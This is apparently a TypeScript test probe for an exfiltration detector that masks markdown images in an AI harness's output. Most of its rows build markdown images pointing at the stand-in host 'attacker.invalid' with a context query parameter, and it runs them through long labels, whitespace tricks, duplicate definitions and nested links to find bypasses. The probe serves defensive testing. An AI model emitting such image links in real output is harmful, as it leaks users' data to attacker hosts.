// T78 — attacking the NEW label condition specifically, plus a hunt for shapes
// neither T72 nor T77 tried, with `marked` as the rendering oracle.
//
// The condition under attack: `nonWhitespaceCount(span) <= maxKeyLength`, where
// maxKeyLength is the longest key THIS DOCUMENT's own `[ref]: URL` lines produced.
// It is asserted NECESSARY. Three ways it could be wrong:
//   (A) normalisation could SHORTEN a span below its non-whitespace count, so a
//       resolvable label is excluded (a release);
//   (B) the whitespace class used for the prefix counts could disagree with the
//       class `normaliseLabel` collapses, so the count is wrong;
//   (C) the definition TABLE the budget is derived from could disagree with the
//       table a renderer builds — which also decides WHICH span gets masked.
// Read-only, offline, synthetic/reserved hosts only.
import { detectExfil } from "../../../../src/security/detect/exfil";
import { applyRedaction } from "../../../../src/security/redact";
import { marked } from "marked";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const OK = "https://ok.example.org/safe.png";

function rendererImgSrcs(md: string): string[] {
  const html = marked.parse(md, { async: false }) as string;
  return [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/g)].map((m) => m[1] as string);
}
function findings(md: string, allowlist: string[] = []) {
  return detectExfil(md, allowlist);
}
function redacted(md: string, allowlist: string[] = []): string {
  const out = applyRedaction(md, detectExfil(md, allowlist)) as unknown;
  return typeof out === "string" ? out : ((out as { text?: string }).text ?? String(out));
}

// ---------------------------------------------------------------------------
// (A) can `trim -> collapse -> toLowerCase` ever be SHORTER than the span's
//     non-whitespace count? Brute force the whole BMP plus a supplementary plane
//     sample. A single counterexample would make the "necessary" claim false.
// ---------------------------------------------------------------------------
const WS = /\s/;
let shorteningChars: Array<{ cp: number; lower: string }> = [];
let whitespaceClassDisagreement: Array<{ cp: number }> = [];
for (let cp = 0; cp <= 0x10ffff; cp += cp === 0xffff ? 1 : cp > 0xffff ? 977 : 1) {
  if (cp >= 0xd800 && cp <= 0xdfff) continue;
  const ch = String.fromCodePoint(cp);
  const isWs = WS.test(ch);
  // the module's own predicate, transcribed
  const code = ch.charCodeAt(0);
  const moduleSaysWs =
    code === 0x20 || (code >= 0x09 && code <= 0x0d) || (code > 0x7f && WS.test(ch));
  if (isWs !== moduleSaysWs) whitespaceClassDisagreement.push({ cp });
  if (isWs) continue;
  const lower = ch.toLowerCase();
  if (lower.length < ch.length) shorteningChars.push({ cp, lower });
}
// trim() vs \s agreement on the boundary characters
const trimDisagreement: number[] = [];
for (let cp = 0; cp <= 0xffff; cp += 1) {
  if (cp >= 0xd800 && cp <= 0xdfff) continue;
  const ch = String.fromCodePoint(cp);
  if (WS.test(ch) !== (`${ch}x`.trim() === "x")) trimDisagreement.push(cp);
}

// ---------------------------------------------------------------------------
// (C) the definition table. CommonMark: the FIRST definition of a label wins.
//     The detector builds a Map and `set`s every match, so the LAST one wins —
//     and the finding's masked span is that last definition's URL.
// ---------------------------------------------------------------------------
const dupFirstAttacker = `![a]\n\n[a]: ${U}\n[a]: ${OK}\n`;
const dupFirstSafe = `![a]\n\n[a]: ${OK}\n[a]: ${U}\n`;

// ---------------------------------------------------------------------------
// named rows
// ---------------------------------------------------------------------------
const LONGDEF = "z".repeat(4096);
const rows: Record<string, { md: string; allowlist?: string[]; why: string }> = {
  // --- the label-length cliff, re-swept on the shipped code -----------------
  label998: { md: `![a][${"L".repeat(998)}]\n\n[${"L".repeat(998)}]: ${U}\n`, why: "just under the removed constant" },
  label999: { md: `![a][${"L".repeat(999)}]\n\n[${"L".repeat(999)}]: ${U}\n`, why: "at the removed constant" },
  label1000: { md: `![a][${"L".repeat(1000)}]\n\n[${"L".repeat(1000)}]: ${U}\n`, why: "past the removed constant" },
  label1200: { md: `![a][${"L".repeat(1200)}]\n\n[${"L".repeat(1200)}]: ${U}\n`, why: "well past it" },
  label4096: { md: `![a][${LONGDEF}]\n\n[${LONGDEF}]: ${U}\n`, why: "far past it" },
  shortcut4096: { md: `![${LONGDEF}]\n\n[${LONGDEF}]: ${U}\n`, why: "shortcut form, long label" },
  collapsed4096: { md: `![${LONGDEF}][]\n\n[${LONGDEF}]: ${U}\n`, why: "collapsed form, long label" },

  // --- attacking the budget: a USE longer than any definition key -----------
  //     whitespace-inflated use against a short definition
  wsInflatedUse: { md: `![a][b${" ".repeat(400)}c]\n\n[b c]: ${U}\n`, why: "use span 402 chars, key 3 chars: budget counts non-whitespace" },
  wsInflatedDef: { md: `![a][b c]\n\n[b${" ".repeat(400)}c]: ${U}\n`, why: "mirror: definition inflated instead" },
  newlineInLabel: { md: `![a][b\nc]\n\n[b c]: ${U}\n`, why: "newline collapses to one space" },
  tabInLabel: { md: `![a][b\t\t c]\n\n[b c]: ${U}\n`, why: "mixed whitespace run" },
  nbspInLabel: { md: `![a][b c]\n\n[b c]: ${U}\n`, why: "NBSP is \\s in JS but not CommonMark whitespace" },
  caseFoldSharpS: { md: `![a][ẞ]\n\n[ss]: ${U}\n`, why: "capital sharp S case-FOLDS to ss; toLowerCase gives ß" },
  caseFoldDotI: { md: `![a][İ]\n\n[i̇]: ${U}\n`, why: "dotted capital I lowercases to 2 code units" },

  // --- the duplicate-definition question ------------------------------------
  dupFirstAttacker: { md: dupFirstAttacker, why: "CommonMark: FIRST definition wins; detector's Map keeps the LAST" },
  dupFirstSafe: { md: dupFirstSafe, why: "mirror" },
  dupFirstAttackerAllowlisted: { md: dupFirstAttacker, allowlist: ["ok.example.org"], why: "same, under the documented allowlist remedy" },

  // --- nesting shapes neither round drove -----------------------------------
  imageInLinkInLink: { md: `[[![x](${U})](https://ci.example.com/a)](https://ci.example.com/b)`, why: "image two links deep" },
  imageInLinkMultiline: { md: `[text\n![x](${U})\nmore](https://ci.example.com/a)`, why: "link description spanning lines" },
  refImageInLink: { md: `[![x][r]](https://ci.example.com/a)\n\n[r]: ${U}\n`, why: "full reference image inside a link" },
  imageInLinkAngleDest: { md: `[![x](<${U}>)](<https://ci.example.com/a>)`, why: "angle-bracket destinations both sides" },
  imageInImageInLink: { md: `[![a![b](${U})](${OK})](https://ci.example.com/a)`, why: "image inside an image inside a link" },
  linkDescBracketRun: { md: `[[[![x](${U})]]](https://ci.example.com/a)`, why: "bracket run before the nested image" },
  imageAfterLinkDest: { md: `[a](https://ci.example.com/a)![x](${U})`, why: "image just past a link destination (skip-window boundary)" },
  imageInsideLinkDest: { md: `[a](https://ci.example.com/[![x](${U})])`, why: "image inside a link DESTINATION — renderer must not fetch" },
};

type Row = {
  id: string;
  rendererImgs: string[];
  rendererFetchesAttacker: boolean;
  detectorFindings: number;
  maskedOutputStillHasAttacker: boolean;
  verdict: string;
  why: string;
};
const out: Row[] = [];
for (const [id, row] of Object.entries(rows)) {
  const imgs = rendererImgSrcs(row.md);
  const fetchesAtt = imgs.some((s) => s.includes(ATT));
  const f = findings(row.md, row.allowlist ?? []);
  const masked = redacted(row.md, row.allowlist ?? []);
  const leaks = masked.includes(ATT);
  out.push({
    id,
    rendererImgs: imgs,
    rendererFetchesAttacker: fetchesAtt,
    detectorFindings: f.length,
    maskedOutputStillHasAttacker: leaks,
    verdict: fetchesAtt && leaks ? "BYPASS" : fetchesAtt && !leaks ? "closed" : leaks ? "released-not-rendered" : "ok",
    why: row.why,
  });
}

// ---------------------------------------------------------------------------
// the benign-corpus +2: confirm the MECHANISM, not the count. Is the ex09
// vector's finding inside an inline LINK's description in the fixture's bytes?
// ---------------------------------------------------------------------------
const fixture = await Bun.file(
  ".claude/worktrees/keryx-harness-phase-1-109f34/fixtures/exfil/cases.json",
).text();
const fixtureFindings = detectExfil(fixture, []);
const ex09 = fixtureFindings.find((m) => String(m.value).includes("c2.example-attacker.com"));
// the enclosing construct: the nearest preceding `[` whose `]` is followed by `(`
let enclosingLink: { open: number; descriptionEnd: number; dest: string } | null = null;
if (ex09) {
  for (let i = (ex09.start as number) - 1; i >= 0 && !enclosingLink; i -= 1) {
    if (fixture[i] !== "[") continue;
    let depth = 0;
    for (let j = i; j < fixture.length; j += 1) {
      if (fixture[j] === "[") depth += 1;
      else if (fixture[j] === "]") {
        depth -= 1;
        if (depth === 0) {
          if (fixture[j + 1] === "(" && j + 1 > (ex09.start as number)) {
            const close = fixture.indexOf(")", j + 1);
            enclosingLink = {
              open: i,
              descriptionEnd: j + 1,
              dest: fixture.slice(j + 1, close + 1).slice(0, 80),
            };
          }
          break;
        }
      }
    }
  }
}

console.log(
  JSON.stringify(
    {
      probe: "T78-md",
      necessity: {
        charactersWhoseLowercaseIsShorter: shorteningChars.length,
        sample: shorteningChars.slice(0, 5),
        whitespaceClassDisagreements: whitespaceClassDisagreement.length,
        trimVsRegexDisagreements: trimDisagreement.length,
        conclusion:
          shorteningChars.length === 0 &&
          whitespaceClassDisagreement.length === 0 &&
          trimDisagreement.length === 0
            ? "normalise(span).length >= nonWhitespaceCount(span) holds; the budget is a NECESSARY condition"
            : "COUNTEREXAMPLE FOUND",
      },
      rows: out,
      bypasses: out.filter((r) => r.verdict === "BYPASS").map((r) => r.id),
      closed: out.filter((r) => r.verdict === "closed").map((r) => r.id),
      corpusMechanism: {
        fixtureFindings: fixtureFindings.length,
        ex09Found: Boolean(ex09),
        ex09Value: ex09 ? String(ex09.value).slice(0, 90) : null,
        enclosingInlineLink: enclosingLink,
        explanationHolds: Boolean(ex09 && enclosingLink),
      },
    },
    null,
    2,
  ),
);
